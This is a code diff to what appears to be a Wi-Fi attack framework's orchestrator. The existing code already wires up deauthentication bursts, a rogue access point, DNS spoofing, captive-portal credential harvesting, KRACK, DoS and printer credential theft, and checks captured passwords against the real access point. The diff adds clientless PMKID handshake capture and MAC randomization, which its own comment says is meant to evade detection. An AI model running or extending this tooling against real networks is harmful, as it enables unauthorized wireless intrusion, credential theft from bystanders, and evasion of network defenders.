@@ -49,6 +49,16 @@ from .dns_spoof import DNSSpoofEngine
 from .cred_harvester import CredentialHarvester, CaptivePortalHarvester
 from .network_disruption import NetworkDisruption, DeauthStorm
 from .post_attack import PostAttackAnalyzer
+
+# ─── External tool integrations (optional — degrade gracefully) ───────────────
+try:
+    from .tools import is_available as _tool_available
+    from .tools.pmkid import PMKIDCapture
+    from .tools.macspoof import MACSpoofer
+    from .tools.scanner import NmapScanner
+    _HAS_TOOLS = True
+except ImportError:
+    _HAS_TOOLS = False
 from .ap_clone import APCloneEngine
 from .krack import KRACKEngine
 from .dos_wifi import WiFiDoSEngine
@@ -81,6 +91,7 @@ class AttackOrchestrator:
                  enable_dos=False, dos_mode=None,
                  enable_client_isolation=False,
                  enable_printer_attacks=False,
+                 enable_pmkid=False, enable_mac_randomize=False,
                  plugins=None, plugins_dir=None):
         self.monitor_iface = monitor_iface
         self.ap_iface = ap_iface
@@ -138,6 +149,13 @@ class AttackOrchestrator:
         self._active_plugins = []
         self._plugins_dir = plugins_dir
         self._requested_plugins = plugins
+
+        # External tool integrations
+        self._pmkid_capture = None
+        self._mac_spoofer = None
+        self._nmap_scanner = None
+        self._enable_pmkid = enable_pmkid
+        self._enable_mac_randomize = enable_mac_randomize
 
         # Client state tracking
         self._client_states = {}  # mac -> state string
@@ -457,6 +475,16 @@ class AttackOrchestrator:
         # PHASE 3: DEAUTH BURST (knock clients off real AP)
         # ══════════════════════════════════════════════════════════════════════
         rogue_mac = str(RandMAC())
+
+        # MAC randomization on monitor interface (evade MAC-based detection)
+        if self._enable_mac_randomize and _HAS_TOOLS:
+            try:
+                self._mac_spoofer = MACSpoofer(self.monitor_iface)
+                self._mac_spoofer.randomize()
+                log.info("  ✓ Monitor interface MAC randomized")
+            except Exception as e:
+                log.debug(f"MAC randomization unavailable: {e}")
+
         self._phase_deauth_burst(close_clients, rogue_mac)
 
         # ══════════════════════════════════════════════════════════════════════
@@ -491,6 +519,18 @@ class AttackOrchestrator:
         self.recon.running = True
         threading.Thread(target=self._background_recon, daemon=True,
                          name="bg-recon").start()
+
+        # PMKID clientless capture (if hcxdumptool available)
+        if self._enable_pmkid and _HAS_TOOLS and _tool_available("hcxdumptool"):
+            try:
+                self._pmkid_capture = PMKIDCapture(self.monitor_iface)
+                self._pmkid_capture.start(
+                    target_bssid=self.target_bssid,
+                    channel=self.target_channel,
+                )
+                log.info("  ✓ PMKID capture active (clientless handshake)")
+            except Exception as e:
+                log.debug(f"PMKID capture unavailable: {e}")
 
         # Credential verification thread (tests captured creds against real AP)
         if self.test_credentials and self.cred_tester:
@@ -643,8 +683,16 @@ class AttackOrchestrator:
             self.dns_spoof, self.cred_harvester, self.portal_harvester,
             self.network_disruption, self.ap_clone, self.krack_engine,
             self.dos_engine, self.client_isolation, self.printer_recon,
-            self.print_interceptor, self.printer_cred_harvester
+            self.print_interceptor, self.printer_cred_harvester,
+            self._pmkid_capture,
         ]
+
+        # Restore MAC address if it was randomized
+        if self._mac_spoofer:
+            try:
+                self._mac_spoofer.restore()
+            except Exception:
+                pass
 
         for engine in engines:
             if engine:
